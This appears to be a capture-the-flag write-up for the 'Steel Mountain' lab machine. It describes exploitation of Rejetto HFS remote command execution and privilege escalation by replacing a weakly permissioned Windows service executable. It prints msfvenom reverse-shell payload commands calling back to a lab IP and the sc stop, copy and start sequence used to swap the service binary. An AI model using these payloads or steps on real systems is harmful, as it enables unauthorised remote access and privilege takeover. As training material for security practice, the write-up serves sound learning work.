Connecting to the service at port 80 with our web browser we can see the picture of the employee of the month.

![Employee of the month](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm1.png "Employee of the month")

If we look at the source code we have the name

![Source code](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm2.png "First question")

## Initial Shell Vulnerability Exploited

If we navigate to port 8080 with a web browser we find this service

![Service in port 8080](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm3.png "Service in port 8080")

### Vulnerability Explanation

According to [this site](https://www.kb.cert.org/vuls/id/251276)

Rejetto HttpFileServer (HFS) versions 2.3, 2.3a, and 2.3b are vulnerable to remote command execution due to a regular expression in parserLib.pas that fails to handle null bytes. Commands that follow a null byte in the search string are executed in the host system.

### Vulnerability Fix

Apply an update. This issue is addressed in HFS version 2.3c and later, available [here](http://www.rejetto.com/hfs/?f=dl)
### Severity

Critical

### Proof of Concept Code Here

In this case we use metasploit framework to gain a shell into the system. We have to set up the options `rhosts` and `rport` to match the machine ip and port of the service.

![Meterpreter session](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm4.png "Meterpreter session")

And we can obtain the user flag.

![User flag](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm5.png "User flag")

## Privilege Escalation

To enumerate this machine we are going to use a powershell script called `PowerUp`. We download it from [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1).

We upload the file to the remote machine with the `upload` command in the meterpreter session, we type `load powershell` to access a poweshell shell and run the script as follows

````shell
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
````
### Vulnerability Exploited

The output of the previous command gives us this information about this windows service

![Exploitable Windows Service](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm6.png "Exploitable windows service")

### Vulnerability Explanation

The remote Windows host has one service with weak file permissions, allowing a
local attacker to gain elevated privileges rewriting it and restarting the service.

### Vulnerability Fix

Ensure that any service executable has the proper permissions.

### Severity

Critical

### Exploit Code

We use `msfvenom` to generate a reverse shell as a Windows executable

````shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.23.211 LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: Advanced.exe
````
We start a listener on port 4443, go back the the meterpreter session, upload the file created, stop the service, replace the file and restart the service as follows

````shell
meterpreter > shell

We receive a shell with elevated privileges, and can read the root flag

![Root flag](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm7.png "Root flag")

## Access and privilege escalation without Metasploit

We use this [exploit](https://www.exploit-db.com/exploits/39161) to gain access to the machine. Previously we need to copy a `nc.exe` binary to the working directory and create a web server with python to serve the content. After that we need to change the `local ip` in the exploit to match ours. Once all is set up we need a listener to the port indicated in the exploit and we have to run the exploit twice to obtain a shell.

Once into the system we can do manual enumeration or use `winPEAS` to detect the vulnerability previously exploited. In this case we use a `msfvenom` payload to create a malicious binary to substitute the service executable with.
````shell
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.23.211 LPORT=4444 -f exe -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: Advanced.exe
````
We serve it with the same web server previously used, and download it to the remote system with powershell. Then we stop the service, rewrite the executable, set up a listener for the LPORT selected and start the service again like this

````shell
c:\Users\bill>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

c:\Users\bill>copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced Systemcare\ASCService.exe"
copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced Systemcare\ASCService.exe"
Overwrite C:\Program Files (x86)\IObit\Advanced Systemcare\ASCService.exe? (Yes/No/All): yes
yes
        1 file(s) copied.

c:\Users\bill>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9
````
And we obtain a shell with elevated privileges.
